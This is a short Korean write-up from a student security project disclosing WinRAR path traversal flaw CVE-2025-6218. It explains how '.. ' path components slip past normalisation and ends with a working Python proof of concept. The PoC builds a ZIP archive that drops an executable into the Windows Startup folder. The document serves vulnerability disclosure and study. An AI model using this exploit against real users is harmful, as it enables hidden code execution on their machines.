화이트햇 스쿨 팀 프로젝트에서 얻은 성과다.
winrar는 전세계적으로 매우 유명한 압축 프로그램이다.
유명한만큼 보안도 뛰어날 줄 알았는데 단순하지만 위험한 취약점을 찾을 수 있었다.

이 취약점은 CVE-2025-6218를 할당받았다.

## 1. 개요

해당 취약점은 ZIP 아카이브 내부에 상대 경로가 포함된 파일명을 가진 파일이 존재할 때 발생한다.

아카이브를 추출할 때 압축 해제 과정에서 해당 상대 경로가 그대로 생성될 수 있으며, 이로 인해 공격자가 Startup 폴더와 같은 위치에 악성 파일을 배치할 수 있다.

이는 사용자가 인지하지 못한 상태에서 시스템 시작 시 임의 코드 실행을 가능하게 할 수 있다.

## 2. 분석

정말 간단한 취약점이라 크게 분석할 부분이 없었다.
취약점이 발생하는 흐름은 다음과 같다.

1. WinRAR는 \ 또는 / 앞의 문자를 확인한다.
2. 바로 앞 문자가 공백이나 마침표(.)가 아니면 처리를 건너뛴다.
3. 경로는 공백으로 시작할 수 없으며, 공백으로 시작하는 경우 _ 로 변환된다.
4. 중간 경로 구성 요소에서 .. 뒤에 오는 공백이 최정 정규화 과정에서 무시된다.


## 3. PoC

```python
import zipfile

with zipfile.ZipFile('PoC.zip', 'w', zipfile.ZIP_DEFLATED) as zipf:
	with open("./a.exe",'rb') as calc:
		data = calc.read()
	
	zipf.writestr(r".. \.. \AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hello.exe", data)
```
